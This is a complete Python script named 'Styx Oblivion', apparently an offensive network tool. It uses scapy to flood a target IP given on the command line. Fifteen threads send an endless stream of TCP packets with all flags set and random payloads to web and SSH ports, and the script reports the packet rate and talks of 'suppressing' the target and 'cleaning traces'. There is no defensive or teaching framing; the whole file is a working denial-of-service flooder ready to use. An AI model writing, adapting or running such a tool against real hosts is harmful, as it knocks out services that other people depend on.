import os
import sys
import time
import random
import threading
from scapy.all import IP, TCP, ICMP, send, Raw

VERSION = "v1.5"
AUTHOR = "HPPERR"
LICENSE_KEY = "HP-DECEPTION-OP-2026"

R = '\033[91m' 
Y = '\033[93m'
G = '\033[92m' 
C = '\033[96m' 
W = '\033[0m'  
BOLD = '\033[1m'

def print_copyright_banner():
    os.system('clear')
    banner = f"""
{R}{BOLD}    ███████╗████████╗██╗   ██╗██╗  ██╗     ██████╗ ██████╗ ██╗     ██╗██╗   ██╗██╗ ██████╗ ███╗   ██╗
    ██╔════╝╚══██╔══╝╚██╗ ██╔╝╚██╗██╔╝    ██╔═══██╗██╔══██╗██║     ██║██║   ██║██║██╔═══██╗████╗  ██║
    ███████╗   ██║    ╚████╔╝  ╚███╔╝     ██║   ██║██████╔╝██║     ██║██║   ██║██║██║   ██║██╔██╗ ██║
    ╚════██║   ██║     ╚██╔╝   ██╔██╗     ██║   ██║██╔══██╗██║     ██║╚██╗ ██╔╝██║██║   ██║██║╚██╗██║
    ███████║   ██║      ██║   ██╔╝ ██╗    ╚██████╔╝██████╔╝███████╗██║ ╚████╔╝ ██║╚██████╔╝██║ ╚████║
    ╚══════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                   
                       {Y}SUPPRESSION ENGINE - VERSION {VERSION}{W}
               {G}PROPRIETARY SOFTWARE BY: {AUTHOR} | LICENSE: {LICENSE_KEY}{W}
    """
    print(banner)
    print(f"{C}[*]{W} Initializing Styx Oblivion - Logic Suppressor...")
    print(f"{C}[*]{W} Target Analysis: {BOLD}Active{W}")
    print("-" * 80)

class StyxOblivion:
    def __init__(self, target_ip):
        self.target = target_ip
        self.is_active = True
        self.packet_count = 0
        self.lock = threading.Lock()

    def protocol_fuzzing(self):
        while self.is_active:
            try:
                custom_ip = IP(dst=self.target, ttl=random.randint(64, 255))
                custom_tcp = TCP(
                    sport=random.randint(1024, 65535), 
                    dport=[80, 443, 8080, 22], 
                    flags="FSRPAU" 
                )
                payload = Raw(load=os.urandom(random.randint(10, 60)))
                
                send(custom_ip/custom_tcp/payload, verbose=False)
                with self.lock: self.packet_count += 1
            except: pass

    def monitor(self):
        start_time = time.time()
        while self.is_active:
            elapsed = time.time() - start_time
            pps = int(self.packet_count / elapsed) if elapsed > 0 else 0
            sys.stdout.write(f"\r{Y}[+]{W} STATUS: {G}SUPPRESSING{W} | PACKETS SENT: {Y}{self.packet_count:<8}{W} | RATE: {R}{pps} p/s{W}")
            sys.stdout.flush()
            time.sleep(0.5)

    def run(self):
        for _ in range(15):
            threading.Thread(target=self.protocol_fuzzing, daemon=True).start()
      
        self.monitor()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_copyright_banner()
        print(f"{R}[!] Error: Missing target IP.{W}")
        print(f"{Y}[Usage]: sudo python3 styx_oblivion.py <TARGET_IP>{W}")
        sys.exit(1)

    print_copyright_banner()
    target = sys.argv[1]
    engine = StyxOblivion(target)
    try:
        engine.run()
    except KeyboardInterrupt:
        engine.is_active = False
        print(f"\n\n{G}[+] Engagement Terminated. Cleaning traces...{W}")